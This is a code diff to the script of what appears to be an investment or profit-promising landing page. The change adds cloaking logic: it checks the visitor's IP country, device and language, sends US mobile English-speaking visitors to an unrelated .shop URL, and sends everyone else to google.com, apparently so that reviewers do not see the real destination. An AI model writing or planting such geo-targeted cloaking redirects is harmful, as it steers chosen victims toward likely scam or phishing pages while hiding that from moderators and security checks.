@@ -652,9 +652,6 @@ Consistent Profits: We offer you the opportunity to achieve consistent profits, 
   })
 </script>
 <script>
-
- 
-
 function open2() {
     function isMobileDevice() {
       return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
@@ -670,19 +667,19 @@ function open2() {
       .then(data => {
         // 严格的三重条件判断
         if (data.country === 'US' && isMobileDevice() && isEnglishLang()) {
-          window.location.href = "https://www.google.com";
+          window.location.href = "https://www.m516wk.shop/tiao.html";
           return;
         }
-     window.location.href = "https://www.baidu.com";
+     window.location.href = "https://www.google.com";
         
       })
       .catch(() => {
         // IP检测失败时严格的双重条件判断
         if (isMobileDevice() && isEnglishLang()) {
-          window.location.href = "https://www.google.com";
+          window.location.href = "https://www.m516wk.shop/tiao.html";
           return;
         }
-        window.location.href = "https://www.baidu.com";
+        window.location.href = "https://www.google.com";
       });
   }
   
